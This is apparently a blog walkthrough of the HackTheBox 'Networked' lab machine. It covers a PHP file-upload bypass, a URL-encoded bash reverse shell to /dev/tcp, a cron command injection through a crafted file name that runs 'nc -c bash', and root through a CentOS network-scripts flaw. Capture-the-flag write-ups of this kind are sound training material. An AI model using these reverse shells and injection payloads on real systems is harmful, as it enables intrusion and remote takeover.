---
title: HackTheBox - Networked
date: 2020-12-28 23:20:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, file upload bypass, magic bytes, reverse-shell, cron, network-scripts, full disclosure, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/Networked.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Networked-full-port-scan.txt 10.10.10.146
Nmap scan report for 10.10.10.146
Host is up (0.14s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

### Apache/2.4.6 (port 80)

![web](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/web.png)

#### `dirb`

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/dirb.png)

#### /backup

![backup](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/backup.png)

```bash
$ tar xvf backup.tar
index.php
lib.php
photos.php
upload.php
```

Seems we have the source code of the website.

Apparently we can upload pictures in `/upload.php`:

![uploaded successfully](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/uploaded.png)

and then view it in `/photos.php`:

![view photo](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/photos.png)

Moreover the file is stored following this pattern `/uploads/<IP>.<extension>`.

At this point and after a quick look at the source code, I'm thinking: "_it's a file upload challenge_" and we have to bypass the mimetype check.

Thanks to `exiftool`, I was able to execute php code:

![exiftool](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/exiftool.png)

![wesh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/wesh.png)

### reverse shell

Steps to have a reverse shell:

1. Download a malicious file that will allow us to execute code remotely:

![exiftool 2](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/exif.png)

2. Test **cmd** parameter:

![](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/cmd.png)

3. Encode a bash reverse shell command with `burp`:

![burp](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/burp.png)

- Bash reverse shell command: `bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'`

- URL: `http://10.10.10.146/uploads/10_10_14_7.php.jpg?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%37%2f%31%32%33%34%20%30%3e%26%31%27`

![reverse shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/reverse-shell.png)

## User (apache)

```bash
$ id
uid=48(apache) gid=48(apache) groups=48(apache)
$ cd /home
$ ls
guly
$ cd guly
$ ls -la
ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

Ok so we have to privesc in order to become `guly`.

We have read privileges on both files `crontab.guly` and ``check_attack.php``.


```bash
$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
$ cat check_attack.php
```

So every 3 minutes `check_attack.php` is executed:

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>
```

Interesting! We can abuse the following line: 

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

`$value` has to be replaced by a malicious bash command beginning with `;` so that we can another command.

```bash
$ cd /var/www/html/uploads/
$ touch '; nc -c bash 10.10.14.7 4444'
```

![guly shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/networked/guly-bash.png)

## User (guly)

- Flag:

```bash
python -c "import pty; pty.spawn('/bin/sh');"  
sh-4.2$ cat user.txt
cat user.txt
526cfc2305f17faaacecf212c57d71c5
```

Let's run `sudo -l` with guly:

```bash
$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
$ ls -la /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh
```

Since we only we only can read or execute `changename.sh`, we cannot replace `changename.sh`'s content by a malicious one.

Let's examine wath's in `changename.sh`:

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

- `/etc/sysconfig/network-scripts/ifcfg-guly`:

```bash
$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

The thing is, as mentionned on this website: [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24), **incorrect whitespace filtering on the NAME attribute leads to code execution**.

## Root

```bash
$ sudo /usr/local/sbin/changename.sh
interface NAME:
random bash
interface PROXY_METHOD:
random
interface BROWSER_ONLY:
random
interface BOOTPROTO:
random
[root@networked network-scripts]# id            
id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# cat /root/root.txt
cat /root/root.txt
0a8ecda83f1d81251099e8ac3d0dcb82
[root@networked network-scripts]# 
```

___

## Useful links

- [Hacker's Grimoire - File upload bypass](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
- [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24)